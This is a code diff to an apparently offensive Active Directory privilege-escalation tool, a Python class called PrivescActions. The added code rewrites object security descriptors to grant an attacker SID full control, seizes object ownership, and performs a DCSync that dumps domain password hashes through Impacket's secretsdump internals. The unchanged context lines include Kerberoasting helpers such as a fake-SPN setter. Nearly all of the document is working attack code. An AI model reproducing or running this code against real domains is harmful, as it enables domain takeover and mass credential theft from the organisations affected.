@@ -7,12 +7,18 @@ import subprocess
 from datetime import datetime
 from pathlib import Path
 
+import ldap3
 from impacket.krb5 import constants
 from impacket.krb5.asn1 import TGS_REP
 from impacket.krb5.kerberosv5 import getKerberosTGS, getKerberosTGT
 from impacket.krb5.types import Principal
+from impacket.examples.secretsdump import NTDSHashes, RemoteOperations
+from impacket.smbconnection import SMBConnection
 from ldap3 import BASE, MODIFY_ADD, SUBTREE
+from ldap3.protocol.microsoft import security_descriptor_control
 from pyasn1.codec.der import decoder
+from impacket.ldap import ldaptypes
+from impacket.ldap.ldaptypes import ACCESS_ALLOWED_ACE, ACCESS_ALLOWED_OBJECT_ACE, ACCESS_MASK, ACE
 
 
 class PrivescActions:
@@ -55,6 +61,116 @@ class PrivescActions:
             print(f"  [!] DN LOOKUP FAILED for {identity}: {e}")
 
         return None
+
+    def get_edge_nodes(self, rel):
+        """Return start/end node dicts, tolerating predictive list-style edges."""
+        start_node = getattr(rel, "start_node", None) or {}
+        end_node = getattr(rel, "end_node", None) or {}
+        if not isinstance(start_node, dict):
+            start_node = self._node_to_dict(start_node)
+        if not isinstance(end_node, dict):
+            end_node = self._node_to_dict(end_node)
+        return start_node, end_node
+
+    def get_object_sid(self, identity):
+        """Resolve objectSid for a DN, UPN, or SAM-style identity."""
+        dn = identity if isinstance(identity, str) and identity.upper().startswith("CN=") else self.resolve_distinguished_name(identity)
+        if not dn:
+            return None
+
+        try:
+            if self.conn.search(dn, "(objectClass=*)", search_scope=BASE, attributes=["objectSid"], size_limit=1) and self.conn.entries:
+                sid_attr = self.conn.entries[0].entry_attributes_as_dict.get("objectSid")
+                return sid_attr[0] if sid_attr else None
+        except Exception as e:
+            print(f"  [!] SID LOOKUP FAILED for {identity}: {e}")
+        return None
+
+    def load_security_descriptor(self, dn):
+        """Read nTSecurityDescriptor for an object."""
+        controls = security_descriptor_control(sdflags=0x07)
+        if self.conn.search(dn, "(objectClass=*)", search_scope=BASE, attributes=["nTSecurityDescriptor"], controls=controls) and self.conn.entries:
+            raw = self.conn.entries[0]["nTSecurityDescriptor"].raw_values[0]
+            sd = ldaptypes.SR_SECURITY_DESCRIPTOR()
+            sd.fromString(raw)
+            return sd
+        return None
+
+    def save_security_descriptor(self, dn, sd):
+        """Write nTSecurityDescriptor back to an object."""
+        controls = security_descriptor_control(sdflags=0x07)
+        self.conn.modify(dn, {"nTSecurityDescriptor": [(ldap3.MODIFY_REPLACE, [sd.getData()])]}, controls=controls)
+
+    def grant_full_control(self, dn, sid):
+        """Add a full-control ACE to an object's DACL."""
+        sd = self.load_security_descriptor(dn)
+        if not sd:
+            return False
+
+        ace = ACE()
+        ace['AceType'] = ACCESS_ALLOWED_ACE.ACE_TYPE
+        ace['AceFlags'] = 0x00
+        ace_data = ACCESS_ALLOWED_ACE()
+        ace_data['Mask'] = ACCESS_MASK()
+        ace_data['Mask']['Mask'] = 983551
+        ace_data['Sid'] = ldaptypes.LDAP_SID()
+        ace_data['Sid'].fromCanonical(sid)
+        ace['Ace'] = ace_data
+
+        if 'Dacl' not in sd or sd['Dacl'] == b'':
+            sd['Dacl'] = ldaptypes.ACL()
+            sd['Dacl']['AclRevision'] = 2
+            sd['Dacl']['Sbz1'] = 0
+            sd['Dacl']['Sbz2'] = 0
+            sd['Dacl']['Data'] = []
+
+        sd['Dacl']['Data'].append(ace)
+        self.save_security_descriptor(dn, sd)
+        return True
+
+    def set_owner(self, dn, sid):
+        """Set the owner SID on an object's security descriptor."""
+        sd = self.load_security_descriptor(dn)
+        if not sd:
+            return False
+
+        sd['OwnerSid'] = ldaptypes.LDAP_SID()
+        sd['OwnerSid'].fromCanonical(sid)
+        self.save_security_descriptor(dn, sd)
+        return True
+
+    def resolve_target(self, rel):
+        """Resolve the most useful target endpoint for a relationship."""
+        start_node, end_node = self.get_edge_nodes(rel)
+        for node in (end_node, start_node):
+            target_dn = node.get("distinguishedname")
+            target_name = node.get("name")
+            if target_dn or target_name:
+                return target_dn or self.resolve_distinguished_name(target_name), target_name
+        return None, None
+
+    @staticmethod
+    def _node_to_dict(node):
+        if isinstance(node, dict):
+            return node
+
+        result = {}
+        if hasattr(node, "get"):
+            result["name"] = node.get("name")
+            result["distinguishedname"] = node.get("distinguishedname")
+            return result
+
+        try:
+            result["name"] = node["name"]
+        except Exception:
+            result["name"] = None
+
+        try:
+            result["distinguishedname"] = node["distinguishedname"]
+        except Exception:
+            result["distinguishedname"] = None
+
+        return result
 
     def _resolve_kerberos_username(self):
         """Return a Kerberos-friendly username from the current LDAP bind identity."""
@@ -107,6 +223,33 @@ class PrivescActions:
             return True
 
         return success
+
+    def dcsync(self, current_password):
+        """Best-effort DCSync using Impacket secretsdump internals."""
+        user = self._resolve_kerberos_username()
+        try:
+            smb = SMBConnection(self.dc_ip, self.dc_ip, sess_port=445)
+            smb.login(user, current_password, self.domain)
+            remote_ops = RemoteOperations(smb, False, kdcHost=self.dc_ip, ldapConnection=self.conn)
+            remote_ops.enableRegistry()
+            boot_key = remote_ops.getBootKey()
+            ntds = NTDSHashes(
+                None,
+                boot_key,
+                isRemote=True,
+                history=False,
+                noLMHash=True,
+                remoteOps=remote_ops,
+                justNTLM=False,
+            )
+            ntds.dump()
+            ntds.finish()
+            remote_ops.finish()
+            print("  [+] DCSYNC COMPLETE")
+            return True
+        except Exception as e:
+            print(f"  [!] DCSYNC FAILED: {e}")
+            return False
 
     def set_fake_spn(self, target_dn, spn_value="viper/roasted"):
         print(f"  [*] Attempting LDAP MODIFY_ADD for servicePrincipalName...")
